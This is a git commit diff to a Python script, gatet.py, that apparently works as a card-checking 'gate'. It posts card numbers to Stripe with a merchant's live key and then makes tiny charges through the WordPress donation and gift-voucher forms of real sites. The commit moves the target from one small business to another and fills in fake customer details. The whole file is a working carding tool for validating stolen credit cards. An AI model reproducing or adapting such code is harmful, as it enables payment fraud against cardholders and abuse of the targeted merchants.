4079346e59fa7e7346f683d6cb18750afa34a81a
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-12 10:22:52 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,27 +26,33 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MRNDIE3QRq1cyWKGH97ZrRmClVNLPXZULnopyhRr8WbGp5QnYJJMsc6ucbAzGuXGeWp3etVRThYeatiY7C8MDb900BNeCu5KH'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '_ga': 'GA1.1.874086042.1744420590',
-	    '__stripe_mid': '38c23e46-5839-4e44-925e-833aa3c4700f9b84e1',
-	    '__stripe_sid': 'd258c87e-0051-4dc4-b13b-d4bb2e2053f762d603',
-	    '_ga_HB3DJBCYR6': 'GS1.1.1744420589.1.1.1744420623.0.0.0',
+	    'cookielawinfo-checkbox-necessary': 'yes',
+	    'cookielawinfo-checkbox-functional': 'yes',
+	    'cookielawinfo-checkbox-performance': 'yes',
+	    'cookielawinfo-checkbox-analytics': 'yes',
+	    'cookielawinfo-checkbox-advertisement': 'yes',
+	    'cookielawinfo-checkbox-others': 'yes',
+	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=',
+	    'viewed_cookie_policy': 'yes',
+	    '__stripe_mid': '1e06d305-c005-4320-825f-3d7235182dd94b3fce',
+	    '__stripe_sid': '157c4e92-1ebd-4e68-991f-f5e30eaf3da1904f64',
 	}
 	
 	headers = {
-	    'authority': 'www.authenticallymindful.com',
+	    'authority': 'ornamentspa.eu',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_ga=GA1.1.874086042.1744420590; __stripe_mid=38c23e46-5839-4e44-925e-833aa3c4700f9b84e1; __stripe_sid=d258c87e-0051-4dc4-b13b-d4bb2e2053f762d603; _ga_HB3DJBCYR6=GS1.1.1744420589.1.1.1744420623.0.0.0',
-	    'origin': 'https://www.authenticallymindful.com',
-	    'referer': 'https://www.authenticallymindful.com/contribute/',
+	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=; viewed_cookie_policy=yes; __stripe_mid=1e06d305-c005-4320-825f-3d7235182dd94b3fce; __stripe_sid=157c4e92-1ebd-4e68-991f-f5e30eaf3da1904f64',
+	    'origin': 'https://ornamentspa.eu',
+	    'referer': 'https://ornamentspa.eu/ponudba/darilni-boni/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -58,17 +64,13 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744420624724',
+	    't': '1744427580057',
 	}
 	
-	data = {
-	    'data': '__fluent_form_embded_post_id=3184&_fluentform_3_fluentformnonce=6dbb5756d9&_wp_http_referer=%2Fcontribute%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&payment_input=Custom%20Amount&custom-payment-amount=0.50&payment_method=stripe&item__3__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
-	    'action': 'fluentform_submit',
-	    'form_id': '3',
-	}
+	data = 'data=__fluent_form_embded_post_id%3D32%26_fluentform_5_fluentformnonce%3De4edf751cf%26_wp_http_referer%3D%252Fponudba%252Fdarilni-boni%252F%26names%255Bfirst_name%255D%3DRodam%2520User%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bzip%255D%3D1008%26input_text%3D0817480671%26input_radio%3DV%2520vrednosti%2520(%25E2%2582%25AC)%26numeric-field%3D20%26input_radio_1%3DPo%2520e-po%25C5%25A1ti%2520(natisne%25C5%25A1%2520ga%2520sam-a)%26terms-n-condition%3Don%26hidden%3D%26numeric-field_1%3D20%252C00%26input_radio_2%3DCredit%2520Card%2520(Stripe)%26payment_method%3Dstripe%26custom-payment-amount_2%3D0.01%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
 	
 	r2 = requests.post(
-	    'https://www.authenticallymindful.com/wp-admin/admin-ajax.php',
+	    'https://ornamentspa.eu/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
